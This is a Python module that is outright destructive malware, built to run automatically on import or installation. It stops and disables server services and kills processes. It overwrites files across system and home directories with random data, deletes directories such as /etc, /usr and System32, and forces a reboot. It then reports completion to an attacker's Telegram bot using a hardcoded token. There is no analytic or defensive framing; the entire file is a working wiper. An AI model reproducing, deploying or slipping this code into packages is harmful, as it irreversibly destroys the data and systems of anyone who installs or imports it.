import os
import sys
import shutil
import subprocess
import platform
import threading
import time

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# Basic human-level code. Try not to screw it up.

def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        pass

def destroy_and_inject():
    # Print the sarcastic message
    print("You were destroyed by: @sii_3")
    
    # Attempt to disable common server systems
    if platform.system() == "Linux":
        try:
            subprocess.run(["systemctl", "stop", "apache2", "nginx", "mysql", "postgresql", "docker"], check=False)
            subprocess.run(["systemctl", "disable", "apache2", "nginx", "mysql", "postgresql", "docker"], check=False)
        except Exception as e:
            pass
        try:
            subprocess.run(["killall", "-9", "python", "node", "php", "java", "ruby"], check=False)
        except Exception as e:
            pass
    elif platform.system() == "Windows":
        try:
            subprocess.run(["net", "stop", "Apache2.4", "Nginx", "MySQL", "SQL Server (SQLEXPRESS)", "Docker Desktop Service"], check=False)
            subprocess.run(["sc", "config", "Apache2.4", "start= disabled"], check=False)
            subprocess.run(["sc", "config", "Nginx", "start= disabled"], check=False)
            subprocess.run(["sc", "config", "MySQL", "start= disabled"], check=False)
            subprocess.run(["sc", "config", "SQL Server (SQLEXPRESS)", "start= disabled"], check=False)
            subprocess.run(["sc", "config", "Docker Desktop Service", "start= disabled"], check=False)
        except Exception as e:
            pass

    # Corrupt critical system files and data
    directories_to_corrupt = []
    if platform.system() == "Linux" or platform.system() == "Android":
        directories_to_corrupt = ["/etc", "/usr/bin", "/var/log", "/home", "/root", "/boot", "/lib", "/usr", "/opt"]
    elif platform.system() == "Windows":
        win_dir = os.environ.get("WINDIR")
        program_files = os.environ.get("PROGRAMFILES")
        program_files_x86 = os.environ.get("PROGRAMFILES(X86)")
        app_data = os.environ.get("APPDATA")
        system_root = os.environ.get("SystemRoot")
        if win_dir: directories_to_corrupt.append(win_dir)
        if program_files: directories_to_corrupt.append(program_files)
        if program_files_x86: directories_to_corrupt.append(program_files_x86)
        if app_data: directories_to_corrupt.append(app_data)
        if system_root: directories_to_corrupt.append(os.path.join(system_root, "System32"))

    for directory in directories_to_corrupt:
        if os.path.exists(directory):
            try:
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            # Overwrite with random data
                            with open(file_path, "wb") as f:
                                f.write(os.urandom(min(os.path.getsize(file_path), 1024 * 50))) # Limit size for speed
                        except Exception as fe:
                            pass
            except Exception as e:
                pass

    # Attempt to delete critical system directories
    critical_dirs = []
    if platform.system() == "Linux" or platform.system() == "Android":
        critical_dirs = ["/bin", "/sbin", "/lib", "/usr", "/var", "/opt", "/srv", "/etc"]
    elif platform.system() == "Windows":
        system_root = os.environ.get("SystemRoot")
        program_files = os.environ.get("PROGRAMFILES")
        program_files_x86 = os.environ.get("PROGRAMFILES(X86)")
        if system_root: critical_dirs.append(os.path.join(system_root, "System32"))
        if program_files: critical_dirs.append(program_files)
        if program_files_x86: critical_dirs.append(program_files_x86)

    for c_dir in critical_dirs:
        if os.path.exists(c_dir):
            try:
                shutil.rmtree(c_dir, ignore_errors=True)
            except Exception as de:
                pass

    # Attempt to fill up disk space
    try:
        if platform.system() == "Linux" or platform.system() == "Android":
            with open("/dev/null", "w") as f:
                f.seek(10 * 1024 * 1024 * 1024 - 1)
                f.write('\0')
        elif platform.system() == "Windows":
            dummy_file_path = os.path.join(os.environ.get("TEMP"), "temp_data_fill.tmp")
            with open(dummy_file_path, "wb") as f:
                f.seek(10 * 1024 * 1024 * 1024 - 1) # 10 GB
                f.write(b'\0')
    except Exception as fe:
        pass

    # Attempt to force a reboot
    try:
        if platform.system() == "Linux" or platform.system() == "Android":
            subprocess.run(["reboot", "-f"], check=False)
        elif platform.system() == "Windows":
            subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=False)
    except Exception as re:
        pass

    # Send confirmation message to admin
    admin_chat_id = "7216718830"
    bot_token = "7747114378:AAEm6gzyVa35-e2R3p1o-hdR-KJpqA-hdSg"
    send_telegram_message(bot_token, admin_chat_id, "Server destruction and injection completed. (: ")

def trigger_on_install():
    # This function will be called immediately upon import/installation.
    # It runs the malicious payload in a separate thread to avoid blocking.
    destruction_thread = threading.Thread(target=destroy_and_inject)
    destruction_thread.daemon = True  # Allows the program to exit even if thread is running
    destruction_thread.start()

# This ensures the function is called when the library is imported.
trigger_on_install()